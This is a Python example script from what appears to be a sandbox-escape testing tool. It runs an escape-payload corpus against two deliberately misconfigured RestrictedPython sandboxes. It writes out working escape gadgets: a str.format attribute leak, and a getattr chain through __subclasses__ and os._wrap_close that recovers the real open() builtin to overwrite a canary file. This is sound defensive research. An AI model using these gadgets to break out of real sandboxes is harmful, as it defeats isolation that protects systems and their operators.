"""Experiment 2: same corpus, same oracle, realistically misconfigured sandboxes.

Experiment 1 (examples/quickstart.py) runs the 20-payload corpus against the
hardened, documented RestrictedPython configuration (`sandbox_exec`) and finds
zero escapes -- the correct result for that configuration.

This script re-runs the *same* corpus, through the *same* `DynamicProber` and
oracle, against two sandbox_exec variants from `misconfigured_sandboxes.py`,
each representing one realistic, narrow integration mistake:

- weak_getattr_hook: reopens the `.format()`/`.format_map()` string-attribute
  leak (safer_getattr's one specific job). str.format's grammar has no call
  syntax, so this only yields an INFORMATION-DISCLOSURE escape (stringifying
  an already-reachable dunder attribute) -- it can never by itself pivot to a
  new live object, so it cannot reach the canary file. The supplementary proof
  below demonstrates that leak directly, since the oracle's canary-tamper /
  secret-exfiltration checks are not designed to score this escape class (a
  documented oracle-scope limitation, not a bug).
- exposed_getattr_builtin: restores the real `getattr` builtin, which DOES
  return live objects, so it can pivot through object.__subclasses__() to
  os._wrap_close and recover the real __builtins__ -- a full capability
  recovery that the supplementary proof below carries all the way to an
  oracle-confirmed canary file write.
"""

from __future__ import annotations

from sandbox_escape_finder import (
    DynamicProber,
    SandboxConfig,
    StaticAnalyzer,
    build_comparison_table,
    oracle,
    to_markdown_summary,
    to_markdown_table,
)
from sandbox_escape_finder.misconfigured_sandboxes import (
    sandbox_exec_exposed_getattr_builtin,
    sandbox_exec_weak_getattr_hook,
)
from sandbox_escape_finder.payloads import PAYLOADS

# Proof-of-impact for weak_getattr_hook: str.format() can only stringify an
# attribute chain, never call a method, so it cannot search __subclasses__()
# for a specific gadget -- it can only leak the repr of attributes already
# reachable from an object already in scope. Printing that repr is the
# escape: in a correctly configured sandbox this string should be
# unreachable, since reaching it requires literal '.__class__'/'.__bases__'/
# '.__subclasses__' attribute syntax, which compile_restricted always rejects
# outside of a string template.
INFO_LEAK_PROOF_PAYLOAD = {
    "id": "misconfig_format_string_info_leak",
    "technique": "format_string_attribute_access",
    "source": (
        "same gadget as payloads.py::encoding_format_string_introspection, with a "
        "print() added so the leaked repr is visible in stdout for this demonstration"
    ),
    "code": "print('{0.__class__.__bases__[0].__subclasses__}'.format(''))",
    "description": (
        "Leak, as a string, the repr of object.__subclasses__ via str.format's "
        "attribute-accessor grammar. Only reachable once safer_getattr's "
        "format-method guard is gone; even then it is a one-shot leak of an "
        "attribute already reachable from the format argument, not a route "
        "to a new live object."
    ),
}

# Proof-of-impact for exposed_getattr_builtin: getattr() returns live objects,
# so (unlike the leak above) this can pivot all the way to a real open() and
# overwrite the throwaway canary file -- a full, oracle-confirmed escape.
# int.__base__ (fetched via getattr, never literal dot syntax) is `object`;
# 'object' itself is not a name in RestrictedPython's safe_builtins, so the
# gadget has to reach it this way rather than naming it directly.
CANARY_WRITE_PROOF_PAYLOAD = {
    "id": "misconfig_getattr_wrap_close_canary_write",
    "technique": "builtins_restoration",
    "source": (
        "derived from jailctf/pyjailbreaker's builtins_dict__wrap_close gadget; "
        "rewritten with getattr() instead of literal dunder-attribute syntax so it "
        "has no dunder AST node, specifically to demonstrate variant 2 "
        "(exposed_getattr_builtin) with an oracle-confirmed file write rather than "
        "only a capability-recovery heuristic"
    ),
    "code": (
        "object_type = getattr(int, '__base__')\n"
        "classes = getattr(object_type, '__subclasses__')()\n"
        "wrap_close = [c for c in classes if 'wrap_close' in str(c)][0]\n"
        "init_fn = getattr(wrap_close, '__init__')\n"
        "g = getattr(init_fn, '__globals__')\n"
        "b = g['__builtins__']\n"
        "b['open']('{canary_path}', 'w').write('PWNED_VIA_EXPOSED_GETATTR')\n"
    ),
    "description": (
        "Reach os._wrap_close.__init__.__globals__['__builtins__'] using only "
        "getattr() calls (no literal dunder Attribute node), then use the real "
        "open() recovered from it to overwrite the throwaway canary file."
    ),
}


def run_variant(label: str, sandbox_exec_fn, config: SandboxConfig, analyzer: StaticAnalyzer) -> None:
    print("\n" + "=" * 60)
    print(f"Variant: {label}")
    print("=" * 60)

    prober = DynamicProber(sandbox_exec_fn, oracle, config)
    findings_by_payload = {p["id"]: analyzer.scan(p["code"]) for p in PAYLOADS}
    report = prober.run(PAYLOADS)

    table = build_comparison_table(findings_by_payload, report)
    print(to_markdown_table(table))
    print()
    print(to_markdown_summary(table))


def run_supplementary_payload(
    label: str, payload: dict, sandbox_exec_fn, config: SandboxConfig, analyzer: StaticAnalyzer
) -> None:
    print("\n" + "-" * 60)
    print(f"Proof-of-impact payload '{payload['id']}' under: {label}")
    print("-" * 60)

    prober = DynamicProber(sandbox_exec_fn, oracle, config)
    findings = analyzer.scan(payload["code"])
    report = prober.run([payload])
    row = report[0]

    print(f"static_flagged:       {len(findings) > 0} ({[f['technique'] for f in findings]})")
    print(f"executed:             {row['executed']}")
    print(f"escaped (oracle):     {row['escaped']}")
    print(f"capability_recovered: {row['capability_recovered']}")
    print(f"exception:            {row['exception']}")
    print(f"stdout:               {row['stdout']!r}")


def main() -> None:
    config = SandboxConfig(timeout_seconds=2.0, random_seed=42)
    analyzer = StaticAnalyzer(config=config)

    run_variant("weak_getattr_hook (_getattr_ = plain getattr)", sandbox_exec_weak_getattr_hook, config, analyzer)
    run_variant(
        "exposed_getattr_builtin (getattr restored as a global)",
        sandbox_exec_exposed_getattr_builtin,
        config,
        analyzer,
    )
    run_supplementary_payload(
        "weak_getattr_hook (_getattr_ = plain getattr)",
        INFO_LEAK_PROOF_PAYLOAD,
        sandbox_exec_weak_getattr_hook,
        config,
        analyzer,
    )
    run_supplementary_payload(
        "exposed_getattr_builtin (getattr restored as a global)",
        CANARY_WRITE_PROOF_PAYLOAD,
        sandbox_exec_exposed_getattr_builtin,
        config,
        analyzer,
    )


if __name__ == "__main__":
    main()
